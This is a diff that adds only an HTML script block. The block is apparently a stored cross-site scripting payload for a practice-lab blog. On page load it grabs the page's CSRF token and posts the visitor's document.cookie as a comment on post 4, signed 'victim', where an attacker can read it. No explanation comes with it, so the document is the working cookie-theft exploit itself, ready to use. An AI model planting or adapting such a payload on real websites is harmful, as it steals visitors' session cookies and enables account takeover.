@@ -1,0 +1,19 @@
+<script>
+  window.addEventListener("DOMContentLoaded", function () {
+    const token = document.getElementsByName("csrf")[0].value;
+
+    let data = new FormData();
+    data.append("csrf", token);
+    data.append("postId", 4);
+    data.append("comment", document.cookie);
+    data.append("name", "victim");
+    data.append("email", "test@example.com");
+    data.append("website", "http://example.com");
+
+    fetch("/post/comment", {
+      method: "POST",
+      mode: "no-cors",
+      body: data,
+    });
+  });
+</script>
